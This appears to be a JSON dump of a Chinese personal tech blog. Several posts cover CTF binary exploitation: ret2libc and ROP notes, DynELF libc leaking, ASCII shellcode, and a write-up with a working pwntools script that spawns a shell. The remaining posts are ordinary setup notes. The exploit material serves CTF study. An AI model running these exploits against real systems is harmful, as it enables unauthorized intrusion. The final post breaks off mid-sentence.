[{"content":"因為前陣子聖誕節抽到了 WF-1000XM4，所以分享一下跟 Airpods Pro 的比較\nWF-1000XM4 因為耳塞的關係，所以在某些活動或發生降操瞬間消失的感覺\n例如重訓跟打哈欠的時候，但是換個副廠的矽膠耳塞應該可以解決這問題\nWF-1000XM4 帶起來滿吃耳朵輪廓的，就我而言 Airpods Pro 比較舒服\n音質方面 WF-1000XM4 比較好\n因為本身用 iphone 的關係系統整合程度還是 Airpods Pro 勝\n有用 android 手機的，耳朵剛好帶起來也適合滿推 WF-1000XM4 的\n","permalink":"https://blog.zet.tw/posts/2022-01-14-airpods-pro-vs-wf-1000xm4/","summary":"因為前陣子聖誕節抽到了 WF-1000XM4，所以分享一下跟 Airpods Pro 的比較\nWF-1000XM4 因為耳塞的關係，所以在某些活動或發生降操瞬間消失的感覺\n例如重訓跟打哈欠的時候，但是換個副廠的矽膠耳塞應該可以解決這問題\nWF-1000XM4 帶起來滿吃耳朵輪廓的，就我而言 Airpods Pro 比較舒服\n音質方面 WF-1000XM4 比較好\n因為本身用 iphone 的關係系統整合程度還是 Airpods Pro 勝\n有用 android 手機的，耳朵剛好帶起來也適合滿推 WF-1000XM4 的","title":"Airpods Pro and WF-1000XM4"},{"content":"紀錄一下安裝清單\nscoop 是一套 windows 下的 installer，有點像是 MacOS 下的 brew 以 powershell 當做後端\n也有許多 buckets 可以加入\nscoop bucket add nerd-fonts scoop bucket add extras 7zip 21.07 [main] ag 2.2.5 [main] anydesk 7.0.4 [extras] aria2 1.36.0-1 [main] bat 0.19.0 [main] cacert 2021-10-26 [main] cmake 3.22.1 [main] croc 9.5.0 [main] curl 7.81.0 [main] dark 3.11.2 [main] draw.io 16.0.0 [extras] DroidSansMono-NF 2.1.0 [nerd-fonts] file 5.38 [main] FiraCode 6.2 [nerd-fonts] firefox 95.0.2 [extras] git 2.34.1.windows.1 [main] hashcheck 2.4.0 [extras] hugo 0.91.2 [main] keepassxc 2.6.6 [extras] lessmsi 1.10.0 [main] llvm 13.0.0 [main] make 4.3 [main] mattermost 5.0.2 [extras] Meslo-NF 2.1.0 [nerd-fonts] netcat 1.12 [main] obs-studio 27.1.3 [extras] posh-git 1.0.0 [extras] processhacker 2.39 [extras] python 3.10.1 [main] rufus 3.17 [extras] SourceCodePro-NF 2.1.0 [nerd-fonts] speedtest-cli 1.1.1 [main] sqlitebrowser 3.12.2 [extras] sudo 0.2020.01.26 [main] sysinternals 2021.October.26 [extras] teamviewer 15.24.5 [extras] telegram 3.3.0 [extras] Ubuntu-NF 2.1.0 [nerd-fonts] UbuntuMono-NF 2.1.0 [nerd-fonts] vim 8.2.2824 [main] vlc 3.0.16 [extras] vscode 1.63.2 [extras] wget 1.21.2 [main] winbox 3.31 [extras] winscp 5.19.5 [extras] x64dbg 2021-12-05_15-32 [extras] xmake 2.6.2 [main] yara 4.1.3-1755 [main] ","permalink":"https://blog.zet.tw/posts/2022-01-12-scoop-install-list/","summary":"紀錄一下安裝清單\nscoop 是一套 windows 下的 installer，有點像是 MacOS 下的 brew 以 powershell 當做後端\n也有許多 buckets 可以加入\nscoop bucket add nerd-fonts scoop bucket add extras 7zip 21.07 [main] ag 2.2.5 [main] anydesk 7.0.4 [extras] aria2 1.36.0-1 [main] bat 0.19.0 [main] cacert 2021-10-26 [main] cmake 3.22.1 [main] croc 9.5.0 [main] curl 7.81.0 [main] dark 3.11.2 [main] draw.io 16.0.0 [extras] DroidSansMono-NF 2.1.0 [nerd-fonts] file 5.38 [main] FiraCode 6.2 [nerd-fonts] firefox 95.0.2 [extras] git 2.34.1.windows.1 [main] hashcheck 2.","title":"Scoop install list"},{"content":"因為在網路上買了一片 ASRock 的二手 server 主機板，想用 IPMI 的功能，不過密碼已經被改過了，所以上網找一下有沒有可以 reset 的方法\n首先可以用個隨便 windows 開機，下載 supermicro 的工具 IPMICFG\nhttps://www.supermicro.com/SwDownload/SwSelect_Free.aspx?cat=IPMI\nipmicfg -user list Maximum number of Users : 10 Count of currently enabled Users : 1 User ID | User Name | Privilege Level | Enable --------|-----------|-----------------|------- 2 | admin | Administrator | Yes ipmicfg -user setpwd 2 admin 或是回到原廠設定\nipmicfg -fd ref\n https://blog.kingj.net/2014/03/15/how-to/resetting-the-ipmi-password-on-the-e3c224d2i/ https://support.siliconmechanics.com/portal/en/kb/articles/resetting-the-bmc\n","permalink":"https://blog.zet.tw/posts/2020-09-05-asrock-ipmi-reset/","summary":"因為在網路上買了一片 ASRock 的二手 server 主機板，想用 IPMI 的功能，不過密碼已經被改過了，所以上網找一下有沒有可以 reset 的方法\n首先可以用個隨便 windows 開機，下載 supermicro 的工具 IPMICFG\nhttps://www.supermicro.com/SwDownload/SwSelect_Free.aspx?cat=IPMI\nipmicfg -user list Maximum number of Users : 10 Count of currently enabled Users : 1 User ID | User Name | Privilege Level | Enable --------|-----------|-----------------|------- 2 | admin | Administrator | Yes ipmicfg -user setpwd 2 admin 或是回到原廠設定\nipmicfg -fd ref\n https://blog.kingj.net/2014/03/15/how-to/resetting-the-ipmi-password-on-the-e3c224d2i/ https://support.siliconmechanics.com/portal/en/kb/articles/resetting-the-bmc","title":"ASRock IPMI reset"},{"content":"之前刷 Router 的時候不小心把它刷爆了，變成磚，可以透過 FT232 工具把 Router 的殼拆掉，對接上面的 RS232，其中 GND, TX, RX 接到電腦可以直接下 command，也可以執行 system shell。\n使用 Putty 連接 FT232 的 COM Port，至於Router板子上面的腳位可以透過 DD-WRT 或是 Open-WRT 中的 Wiki，幾乎很多路由器都有可以參考的資料。\n例如：https://wiki.openwrt.org/toh/d-link/dir-300revb\n接上以後會出現以下選單，手速要快一點，選擇 \u0026ldquo;2\u0026rdquo; 可以連接到電腦架設的 TFTP Server 抓取韌體並重刷。\nPlease choose the operation: 1: Load system code to SDRAM via TFTP. 2: Load system code then write to Flash via TFTP. 3: Boot system code via Flash (default). 4: Entr boot command line interface. 7: Load Boot Loader code then write to Flash via Serial. 9: Load Boot Loader code then write to Flash via TFTP. 電腦設定固定 ip，然後網路線連到 Router，輸入電腦 ip 與韌體的檔名就好了。\n","permalink":"https://blog.zet.tw/posts/2018-08-17-use-ttl-to-unbrick-router/","summary":"之前刷 Router 的時候不小心把它刷爆了，變成磚，可以透過 FT232 工具把 Router 的殼拆掉，對接上面的 RS232，其中 GND, TX, RX 接到電腦可以直接下 command，也可以執行 system shell。\n使用 Putty 連接 FT232 的 COM Port，至於Router板子上面的腳位可以透過 DD-WRT 或是 Open-WRT 中的 Wiki，幾乎很多路由器都有可以參考的資料。\n例如：https://wiki.openwrt.org/toh/d-link/dir-300revb\n接上以後會出現以下選單，手速要快一點，選擇 \u0026ldquo;2\u0026rdquo; 可以連接到電腦架設的 TFTP Server 抓取韌體並重刷。\nPlease choose the operation: 1: Load system code to SDRAM via TFTP. 2: Load system code then write to Flash via TFTP. 3: Boot system code via Flash (default). 4: Entr boot command line interface. 7: Load Boot Loader code then write to Flash via Serial.","title":"Use TTL to unbrick router"},{"content":"陸續更新～\nwebsite, doc and video https://ctf-wiki.github.io/ctf-wiki LiveOverflow youtube channel https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w http://liveoverflow.com/binary_hacking/protostar/index.html Heap 手法整理 https://github.com/shellphish/how2heap 日本選手的一系列投影片 http://www.slideshare.net/bata_24/presentations 杨坤：掘金CTF ——CTF中的内存漏洞利用技巧 http://netsec.ccert.edu.cn/wp-content/uploads/2015/10/2015-1029-yangkun-Gold-Mining-CTF.pdf Modern Binary Exploitation by RPISEC http://security.cs.rpi.edu/courses/binexp-spring2015/ https://github.com/RPISEC/MBE https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn inaz2 整理的 exploit 手法 http://inaz2.hatenablog.com/archive/category/Exploit?page=1 http://inaz2.hatenablog.com/archive/category/Exploit?page=2 http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf https://github.com/str4tan/pwning Heap: https://github.com/cloudburst/libheap https://github.com/DhavalKapil/libdheap https://github.com/degrigis/Heapy https://github.com/shellphish/how2heap wargame and ctf https://pwnable.tw/ http://pwnable.kr/ https://bamboofox.cs.nctu.edu.tw/ http://overthewire.org/wargames/ https://w3challs.com/ https://exploit-exercises.com/nebula/ http://ctf.katsudon.org/ http://ctf.katsudon.org/ctf4u/ tools debug\nhttps://github.com/snare/voltron ","permalink":"https://blog.zet.tw/posts/2018-01-09-how-to-pwnable/","summary":"陸續更新～\nwebsite, doc and video https://ctf-wiki.github.io/ctf-wiki LiveOverflow youtube channel https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w http://liveoverflow.com/binary_hacking/protostar/index.html Heap 手法整理 https://github.com/shellphish/how2heap 日本選手的一系列投影片 http://www.slideshare.net/bata_24/presentations 杨坤：掘金CTF ——CTF中的内存漏洞利用技巧 http://netsec.ccert.edu.cn/wp-content/uploads/2015/10/2015-1029-yangkun-Gold-Mining-CTF.pdf Modern Binary Exploitation by RPISEC http://security.cs.rpi.edu/courses/binexp-spring2015/ https://github.com/RPISEC/MBE https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn inaz2 整理的 exploit 手法 http://inaz2.hatenablog.com/archive/category/Exploit?page=1 http://inaz2.hatenablog.com/archive/category/Exploit?page=2 http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf https://github.com/str4tan/pwning Heap: https://github.com/cloudburst/libheap https://github.com/DhavalKapil/libdheap https://github.com/degrigis/Heapy https://github.com/shellphish/how2heap wargame and ctf https://pwnable.tw/ http://pwnable.kr/ https://bamboofox.cs.nctu.edu.tw/ http://overthewire.org/wargames/ https://w3challs.com/ https://exploit-exercises.com/nebula/ http://ctf.katsudon.org/ http://ctf.katsudon.org/ctf4u/ tools debug\nhttps://github.com/snare/voltron ","title":"How to pwnalbe"},{"content":"紀錄一下環境的東西，有什麼沒記錄到的之後再更新\n字體 等寬字體\n monaco sourcecode pro Bitstream Vera Sans Mono ubuntu mono  硬體 架了一台家裡的server，跑debian，總耗電瓦數不超過30瓦，非常省電CP值超高!!!，唯一覺得可惜的是，SATA接頭只有2個而且主機板沒有支援RAID的功能\nmb:asus N3150M-E ram:8G storage:120G SSD + 1T 鍵盤 ducky one 80% 茶軸，自己換了PBT鍵帽，PBT摸起來感覺有種粉粉的感覺，也買好清理的，高度Cherry原廠鍵帽的高度，剛開始是OEM不過用個幾天就習慣了\n軟體 f.lux - 飽護眼睛 飽護眼睛的，可以讓白色變得比較黃一點，看久了眼睛不會那麼吃力，字體當然是要調大一點更好\r Karabiner - 鍵盤映射 \u0026lt;https://pqrs.org/osx/karabiner/\u0026gt;\r可以調整osx 的映射鍵把F1-F12 換成，歌曲切換聲音調整之類的，另外我也用內建的工具把`Caps lock`換成 `ctrl`，這樣 tmux 比較好用 `Caps` + `a` 就行\r parallels desktop - 虛擬機 融合模式超猛，偶爾開 IDA Pro 或是些win 的軟體\r VANILLA \u0026lt;http://matthewpalmer.net/vanilla/\u0026gt;\r services docker - nginx - php - ubuntu for pwnable avahi-daemon (在區網中可以直接使用 hostname.local 登入) time-machine (硬碟格式需要注意一下，我是用ext4) samba 在iterm下新增多個profile，搭配command ssh user@192.168.xx.xx ，使用ssh-key cmd + o ，開啟視窗直接選擇要登入的主機爽度大增\npwnable 用docker跑起來的，寫了shell script跟一般的dotfile 分離，有興趣可以看一下 https://github.com/zet235/ctf-tools\nreference\n https://samuelhewitt.com/blog/2015-09-12-debian-linux-server-mac-os-time-machine-backups-how-to\n","permalink":"https://blog.zet.tw/posts/2016-08-05-evn/","summary":"紀錄一下環境的東西，有什麼沒記錄到的之後再更新\n字體 等寬字體\n monaco sourcecode pro Bitstream Vera Sans Mono ubuntu mono  硬體 架了一台家裡的server，跑debian，總耗電瓦數不超過30瓦，非常省電CP值超高!!!，唯一覺得可惜的是，SATA接頭只有2個而且主機板沒有支援RAID的功能\nmb:asus N3150M-E ram:8G storage:120G SSD + 1T 鍵盤 ducky one 80% 茶軸，自己換了PBT鍵帽，PBT摸起來感覺有種粉粉的感覺，也買好清理的，高度Cherry原廠鍵帽的高度，剛開始是OEM不過用個幾天就習慣了\n軟體 f.lux - 飽護眼睛 飽護眼睛的，可以讓白色變得比較黃一點，看久了眼睛不會那麼吃力，字體當然是要調大一點更好\r Karabiner - 鍵盤映射 \u0026lt;https://pqrs.org/osx/karabiner/\u0026gt;\r可以調整osx 的映射鍵把F1-F12 換成，歌曲切換聲音調整之類的，另外我也用內建的工具把`Caps lock`換成 `ctrl`，這樣 tmux 比較好用 `Caps` + `a` 就行\r parallels desktop - 虛擬機 融合模式超猛，偶爾開 IDA Pro 或是些win 的軟體\r VANILLA \u0026lt;http://matthewpalmer.net/vanilla/\u0026gt;\r services docker - nginx - php - ubuntu for pwnable avahi-daemon (在區網中可以直接使用 hostname.","title":"一些環境"},{"content":"整理一下\n找 getgads 工具  rp++ ROPgadget  Ret2libc 當程式有打開NX的時候造成 stack 上的 shellcode 無法執行，可以利用ret2libc或是利用ROP做mprotect開一個rwx的段，\n參數傳遞  x86 利用stack x86_64 利用reg  Ret2libc 疊法 可以盡可能的把參數疊完整，比較不會發生一些鳥問題\n一般x86的疊法是：\npadding + function + ret address + argv1 + argv2 + argv3 .... 一般 function 可以直接跳 .plt ， ret address 是執行完以後我要去的地方，假如一般疊出 system(\u0026quot;/bin/sh\u0026quot;)，ret address 可以直接填空沒關係\n例如 :\n\u0026#39;A\u0026#39;*100 + p32(system_addr) + p32(0) + p32(binsh_addr) x64: 利用一些 pop reg 的getgads把reg設定好\nx32 參數直接疊在stack上，用 pop_ret 清掉用過的參數\nread @ plt pop_pop_pop_ret 0 addr length system @ plt x86_64  最大地址 0x00007fffffffffff  DynELF 假如在不知道對方libc 的情況下可以使用pwntools中的一個工具DynELF，給他一個leak的點，可以幫你找出function的位置\n這是313c CTF 中的 cfy 可以當作練習\nfrom pwn import * import time printf_got = 0x601020 def leak(addr): r.sendline(\u0026#39;2\u0026#39;) r.sendline(p64(addr) ) s = r.recvline_contains(\u0026#39;hex: 0x\u0026#39;)[5:].strip() s = p64( int(s,16) ) return s r = remote(\u0026#39;localhost\u0026#39;,4000) ptr_libc = u64(leak(printf_got)) d = DynELF(leak, ptr_libc) system = d.lookup(\u0026#39;system\u0026#39;) print r.recvuntil(\u0026#39;quit\u0026#39;) r.sendline(\u0026#39;7\u0026#39;) r.sendline(\u0026#39;/bin/sh\\x00\u0026#39; + \u0026#39;A\u0026#39;*8 + p64(system) ) r.interactive() ASLR  aslr on  sudo sysctl -w kernel.randomize_va_space=2  aslr off  sudo sysctl -w kernel.randomize_va_space=0 假如有ASLR，本的的話 32bit可以使用ulimit -s unlimited關閉，或是可以利用puts，leak .got 段上的資料 同一個 libc function 之間的偏移是固定的\n一般常出現的函數 :\n __libc_start_main puts read write \u0026hellip;..  x64 通用gadgets 這些函數都可以利用\n_init _start call_gmon_start deregister_tm_clones register_tm_clones __do_global_dtors_aux frame_dummy __libc_csu_init __libc_csu_fini _fini ROPgadget --binary ./binary --depth 100 不從版本 gadgets 會不太一樣，不過都可以通用，在於__libc_csu_init()\n假如有些指令切一半的話也可以對reg做操作\n\u0026lt;__libc_csu_init\u0026gt;: 5b pop rbx 5d pop rbp 41 5c pop r12 -\u0026gt; pop rsp (5c) 41 5d pop r13 -\u0026gt; pop rbp (5d) 41 5e pop r14 -\u0026gt; pop rsi (5e) 41 5f pop r15 -\u0026gt; pop rdi (5f) c3 ret mov rbx,QWORD PTR [rsp+0x8] mov rbp,QWORD PTR [rsp+0x10] mov r12,QWORD PTR [rsp+0x18] mov r13,QWORD PTR [rsp+0x20] mov r14,QWORD PTR [rsp+0x28] mov r15,QWORD PTR [rsp+0x30] add rsp,0x38 ret 利用這些gadgets可以把 r12-r15 控好，call qword ptr [r12+rbx*8]的時候可以將rbp等於1，rbx等於0才會繼續ret下去，這部分可以自己跟一次比較清楚\n4c 89 ea mov rdx,r13 4c 89 f6 mov rsi,r14 44 89 ff mov edi,r15d 41 ff 14 dc call QWORD PTR [r12+rbx*8] One gadgets RCE 在一些特定的libc中藏有可以直接執行execv(\u0026quot;/bin/sh\u0026quot;)，可以觀察一下libc中有用到execv的附近藏有\u0026quot;/bin/sh\u0026quot;的字串，有機會可以直接成功\n","permalink":"https://blog.zet.tw/posts/2016-05-31-rop/","summary":"整理一下\n找 getgads 工具  rp++ ROPgadget  Ret2libc 當程式有打開NX的時候造成 stack 上的 shellcode 無法執行，可以利用ret2libc或是利用ROP做mprotect開一個rwx的段，\n參數傳遞  x86 利用stack x86_64 利用reg  Ret2libc 疊法 可以盡可能的把參數疊完整，比較不會發生一些鳥問題\n一般x86的疊法是：\npadding + function + ret address + argv1 + argv2 + argv3 .... 一般 function 可以直接跳 .plt ， ret address 是執行完以後我要去的地方，假如一般疊出 system(\u0026quot;/bin/sh\u0026quot;)，ret address 可以直接填空沒關係\n例如 :\n\u0026#39;A\u0026#39;*100 + p32(system_addr) + p32(0) + p32(binsh_addr) x64: 利用一些 pop reg 的getgads把reg設定好\nx32 參數直接疊在stack上，用 pop_ret 清掉用過的參數\nread @ plt pop_pop_pop_ret 0 addr length system @ plt x86_64  最大地址 0x00007fffffffffff  DynELF 假如在不知道對方libc 的情況下可以使用pwntools中的一個工具DynELF，給他一個leak的點，可以幫你找出function的位置","title":"Return Oriented Programming"},{"content":"拿到這題的時候已經是一隻binary了，這是用比較新的gcc編的，對於function call 有一些新的機制，如下：\n80485cb: 8d 4c 24 04 lea ecx,[esp+0x4] 80485cf: 83 e4 f0 and esp,0xfffffff0 80485d2: ff 71 fc push DWORD PTR [ecx-0x4] 80485d5: 55 push ebp 80485d6: 89 e5 mov ebp,esp 80485d8: 51 push ecx 80485d9: 83 ec 34 sub esp,0x34 ...... 8048682: b8 00 00 00 00 mov eax,0x0 8048687: 8b 4d fc mov ecx,DWORD PTR [ebp-0x4] 804868a: c9 leave 804868b: 8d 61 fc lea esp,[ecx-0x4] 804868e: c3 ret 可以看到在初始化的時候lea ecx,[esp+0x4]，會把esp得值放到ecx中 之後再把ecx放到stack上，當我們overflow以後會把原本得直也蓋掉\n題目滿好心的有提供很多東西所以可以算出system的位置，也有給buffer的位置，所以我們直接把 ret address 填到 buffer 開頭的位置這樣esp，控制好以後esp才不會爛掉，之後照正常疊 ret2libc 就行了\nfrom pwn import * e = ELF(\u0026#39;/lib32/libc.so.6\u0026#39;) #e = ELF(\u0026#39;./libc.so.6\u0026#39;) r = remote(\u0026#34;127.0.0.1\u0026#34;,4000) r.recvlines(2) puts = r.recvline().strip()[47:57] print \u0026#39;puts : \u0026#39;,puts puts = int(puts, 16) buffer = r.recvline().strip()[-10:] print \u0026#39;buffer :\u0026#39;,buffer buffer = int(buffer,16) system = puts - ( e.symbols[\u0026#39;puts\u0026#39;] - e.symbols[\u0026#39;system\u0026#39;] ) print \u0026#39;system : \u0026#39;,hex(system) payload = p32(system) + p32(0) + p32(buffer + 4*7) + p32(0) + p32(0) + p32(0) + p32(0) payload += \u0026#39;/bin/sh\\x00\u0026#39; payload += \u0026#39;A\u0026#39;*(44-len(payload)) print len(payload) r.sendline( payload + p32( buffer + 4) ) r.interactive() ","permalink":"https://blog.zet.tw/posts/2016-05-21-tu-ctf-where-heretics-suffer/","summary":"拿到這題的時候已經是一隻binary了，這是用比較新的gcc編的，對於function call 有一些新的機制，如下：\n80485cb: 8d 4c 24 04 lea ecx,[esp+0x4] 80485cf: 83 e4 f0 and esp,0xfffffff0 80485d2: ff 71 fc push DWORD PTR [ecx-0x4] 80485d5: 55 push ebp 80485d6: 89 e5 mov ebp,esp 80485d8: 51 push ecx 80485d9: 83 ec 34 sub esp,0x34 ...... 8048682: b8 00 00 00 00 mov eax,0x0 8048687: 8b 4d fc mov ecx,DWORD PTR [ebp-0x4] 804868a: c9 leave 804868b: 8d 61 fc lea esp,[ecx-0x4] 804868e: c3 ret 可以看到在初始化的時候lea ecx,[esp+0x4]，會把esp得值放到ecx中 之後再把ecx放到stack上，當我們overflow以後會把原本得直也蓋掉","title":"TU CTF - Where Heretics Suffer"},{"content":"把install.sh裡面capstone的地方註解掉後執行\n下載capstone\ngit clone https://github.com/aquynh/capstone.git $ ./make.sh $ sudo ./make.sh install ","permalink":"https://blog.zet.tw/posts/2016-03-16-install-qira-on-rpi/","summary":"把install.sh裡面capstone的地方註解掉後執行\n下載capstone\ngit clone https://github.com/aquynh/capstone.git $ ./make.sh $ sudo ./make.sh install ","title":"Install qira on rpi"},{"content":"可以使用alpha3這套工具，他會產生出具有encoder的ascii shellcode ， 利用本身的encoder去解碼，產生出來的shellcode很短，不過這類的shellcode需要一個reg去指向shellcode的起頭\n其他別種的有些是利用偏移去xor，最後jmp esp去執行\n紀錄一下一題題目的解法： 利用stack上的位置跟ROP的ret跳到那個位置上，再利用stack上的值去跟eax去做xor，利用的是像xor al,[esp+0x34]這類的op code，偏移的部分利用push eax 來填充，最後剛好使eax 指向我們shellcode的位置\n可以參考下方的參考資料\nReferences\n http://inaz2.hatenablog.com/entry/2014/07/11/004655 http://inaz2.hatenablog.com/entry/2014/07/12/000007 http://inaz2.hatenablog.com/entry/2014/07/13/025626 https://code.google.com/archive/p/alpha3/ https://nets.ec/Ascii_shellcode ","permalink":"https://blog.zet.tw/posts/2016-02-09-ascii-shellcode/","summary":"可以使用alpha3這套工具，他會產生出具有encoder的ascii shellcode ， 利用本身的encoder去解碼，產生出來的shellcode很短，不過這類的shellcode需要一個reg去指向shellcode的起頭\n其他別種的有些是利用偏移去xor，最後jmp esp去執行\n紀錄一下一題題目的解法： 利用stack上的位置跟ROP的ret跳到那個位置上，再利用stack上的值去跟eax去做xor，利用的是像xor al,[esp+0x34]這類的op code，偏移的部分利用push eax 來填充，最後剛好使eax 指向我們shellcode的位置\n可以參考下方的參考資料\nReferences\n http://inaz2.hatenablog.com/entry/2014/07/11/004655 http://inaz2.hatenablog.com/entry/2014/07/12/000007 http://inaz2.hatenablog.com/entry/2014/07/13/025626 https://code.google.com/archive/p/alpha3/ https://nets.ec/Ascii_shellcode ","title":"Ascii shellcode"},{"content":"用過prezto與oh-my-zsh的zsh framework以後雖然很方便但是預設會載入一堆插件跟資料，導致開啟shell的時候會有延遲的感覺，尤其進入龐大的git資料夾的時候，速度慢到可以\n嘗試自己寫zshrc把會用到的寫進去就好，速度提升不少，git方面採用比較好的做法，先把原本要輸出在Prompt的git訊息輸出到tmp裡面，等跑完以後在資料撈回Prompt\n大約如下：\nsetopt prompt_subst # enable command substition in prompt autoload -Uz vcs_info zstyle \u0026#39;:vcs_info:*\u0026#39; enable bzr git hg svn zstyle \u0026#39;:vcs_info:*\u0026#39; check-for-changes true zstyle \u0026#39;:vcs_info:*\u0026#39; stagedstr \u0026#39;%F{green}●%f\u0026#39; zstyle \u0026#39;:vcs_info:*\u0026#39; unstagedstr \u0026#39;%F{yellow}●%f\u0026#39; zstyle \u0026#39;:vcs_info:*\u0026#39; formats \u0026#39; %b%c%u\u0026#39; zstyle \u0026#39;:vcs_info:*\u0026#39; actionformats \u0026#34; - [%b%c%u|%F{cyan}%a%f]\u0026#34; zstyle \u0026#39;:vcs_info:(sv[nk]|bzr):*\u0026#39; branchformat \u0026#39;%b|%F{cyan}%r%f\u0026#39; zstyle \u0026#39;:vcs_info:git*+set-message:*\u0026#39; hooks git_status ASYNC_PROC=0 ASYNC_DATA=\u0026#34;${TMPPREFIX}-prompt_sorin_data\u0026#34; function precmd() { function async() { vcs_info # save to temp file printf \u0026#34;%s\u0026#34; \u0026#34;${vcs_info_msg_0_}\u0026#34; \u0026gt; $ASYNC_DATA # signal parent kill -s USR1 $$ } # do not clear RPROMPT, let it persist # kill child if necessary if [[ \u0026#34;${ASYNC_PROC}\u0026#34; != 0 ]]; then kill -s HUP $ASYNC_PROC \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 || : fi # start background computation async \u0026amp;! ASYNC_PROC=$! } function TRAPUSR1() { # read from temp file RPROMPT=\u0026#34;$(cat $ASYNC_DATA)\u0026#34; # reset proc number ASYNC_PROC=0 # redisplay zle \u0026amp;\u0026amp; zle reset-prompt } PROMPT=\u0026#39;%F{cyan}%n@%m%f %F{green}%~%f # \u0026#39; RPROMPT=\u0026#39;\u0026#39; References\n http://www.anishathalye.com/2015/02/07/an-asynchronous-shell-prompt/ https://linuxtoy.org/archives/zsh_per_dir_hist.html http://www.cnblogs.com/ma6174/archive/2012/05/08/2490921.html ","permalink":"https://blog.zet.tw/posts/2016-02-07-zshrc/","summary":"用過prezto與oh-my-zsh的zsh framework以後雖然很方便但是預設會載入一堆插件跟資料，導致開啟shell的時候會有延遲的感覺，尤其進入龐大的git資料夾的時候，速度慢到可以\n嘗試自己寫zshrc把會用到的寫進去就好，速度提升不少，git方面採用比較好的做法，先把原本要輸出在Prompt的git訊息輸出到tmp裡面，等跑完以後在資料撈回Prompt\n大約如下：\nsetopt prompt_subst # enable command substition in prompt autoload -Uz vcs_info zstyle \u0026#39;:vcs_info:*\u0026#39; enable bzr git hg svn zstyle \u0026#39;:vcs_info:*\u0026#39; check-for-changes true zstyle \u0026#39;:vcs_info:*\u0026#39; stagedstr \u0026#39;%F{green}●%f\u0026#39; zstyle \u0026#39;:vcs_info:*\u0026#39; unstagedstr \u0026#39;%F{yellow}●%f\u0026#39; zstyle \u0026#39;:vcs_info:*\u0026#39; formats \u0026#39; %b%c%u\u0026#39; zstyle \u0026#39;:vcs_info:*\u0026#39; actionformats \u0026#34; - [%b%c%u|%F{cyan}%a%f]\u0026#34; zstyle \u0026#39;:vcs_info:(sv[nk]|bzr):*\u0026#39; branchformat \u0026#39;%b|%F{cyan}%r%f\u0026#39; zstyle \u0026#39;:vcs_info:git*+set-message:*\u0026#39; hooks git_status ASYNC_PROC=0 ASYNC_DATA=\u0026#34;${TMPPREFIX}-prompt_sorin_data\u0026#34; function precmd() { function async() { vcs_info # save to temp file printf \u0026#34;%s\u0026#34; \u0026#34;${vcs_info_msg_0_}\u0026#34; \u0026gt; $ASYNC_DATA # signal parent kill -s USR1 $$ } # do not clear RPROMPT, let it persist # kill child if necessary if [[ \u0026#34;${ASYNC_PROC}\u0026#34; !","title":"zshrc"},{"content":"搜尋\naptitude search linux-image- 安裝\naptitude install linux-image-xxxx 或是上網找尋deb檔下載安裝\nwget http://kr.archive.ubuntu.com/ubuntu/pool/main/l/linux-lts-utopic/linux-image-3.16.0-30-generic_3.16.0-30.40~14.04.1_amd64.deb sudo dpkg -i *.deb 查看kernel安裝紀錄\ndpkg --get-selections | grep linux-image 移除舊kernel\naptitude remove linux-image-3.19.0-18-generic linux kernel exploits db\nhttps://www.kernel-exploits.com/\n","permalink":"https://blog.zet.tw/posts/2016-01-05-linux-kernel-exploits-tested/","summary":"搜尋\naptitude search linux-image- 安裝\naptitude install linux-image-xxxx 或是上網找尋deb檔下載安裝\nwget http://kr.archive.ubuntu.com/ubuntu/pool/main/l/linux-lts-utopic/linux-image-3.16.0-30-generic_3.16.0-30.40~14.04.1_amd64.deb sudo dpkg -i *.deb 查看kernel安裝紀錄\ndpkg --get-selections | grep linux-image 移除舊kernel\naptitude remove linux-image-3.19.0-18-generic linux kernel exploits db\nhttps://www.kernel-exploits.com/","title":"Linux kernel exploits tested"},{"content":"ub 14.04 x64\ni32 lib apt-get install gcc-multilib cd /etc/apt/sources.list.d echo \u0026#34;deb http://old-releases.ubuntu.com/ubuntu/ raring main restricted universe multiverse\u0026#34; \u0026gt;ia32-libs-raring.list apt-get update apt-get install ia32-libs dpkg --add-architecture i386 apt-get update apt-get install libssl-dev:i386 PEDA apt-get install nasm micro-inetd apt-get install libc6-dbg https://github.com/longld/peda qira https://github.com/BinaryAnalysisPlatform/qira\npwntools 包含checksec, ROPgadget Tools\nsudo pip install git+https://github.com/Gallopsled/pwntools#egg=pwntools fix bug\ncp /usr/local/lib/python2.7/dist-packages/usr/lib/python2.7/dist-packages/capstone/libcapstone.so /usr/local/lib/python2.7/dist-packages/capstone/. rp++ https://github.com/0vercl0k/rp/downloads\nncat sudo apt-get install netcat-traditional netcat-openbsd nmap ","permalink":"https://blog.zet.tw/posts/2015-11-25-pwn-tool-list/","summary":"ub 14.04 x64\ni32 lib apt-get install gcc-multilib cd /etc/apt/sources.list.d echo \u0026#34;deb http://old-releases.ubuntu.com/ubuntu/ raring main restricted universe multiverse\u0026#34; \u0026gt;ia32-libs-raring.list apt-get update apt-get install ia32-libs dpkg --add-architecture i386 apt-get update apt-get install libssl-dev:i386 PEDA apt-get install nasm micro-inetd apt-get install libc6-dbg https://github.com/longld/peda qira https://github.com/BinaryAnalysisPlatform/qira\npwntools 包含checksec, ROPgadget Tools\nsudo pip install git+https://github.com/Gallopsled/pwntools#egg=pwntools fix bug\ncp /usr/local/lib/python2.7/dist-packages/usr/lib/python2.7/dist-packages/capstone/libcapstone.so /usr/local/lib/python2.7/dist-packages/capstone/. rp++ https://github.com/0vercl0k/rp/downloads\nncat sudo apt-get install netcat-traditional netcat-openbsd nmap ","title":"PWN tool list"},{"content":"簡單紀錄一下\nPWN1 丟進ida 可以看到\nif ( v4 == 0x90909090 ) result = puts(aCensordCensord); else result = printf(\u0026#34;Your point is only %d, try hard!\\n\u0026#34;, v4, v1, v2, v3); return result; 直接塞90結束\npython -c \u0026#39;print \u0026#34;\\x90\u0026#34;*1000\u0026#39; | nc 52.69.163.194 1111 PWN2 定位到地20個字以後可以控制eip\ngdb-peda$ info functions All defined functions: Non-debugging symbols: 0x08048364 _init 0x080483a0 read@plt 可以指到read上,一般來說長這樣\ncall ret argv1 ￼argv2 argv3 可以控制read的返回地址跟參數,所以可以把ret跟我們shellcode 指到同一個位置上,shellcode的話隨便找一段空⽩白的地⽅方寫上去就好\nfrom 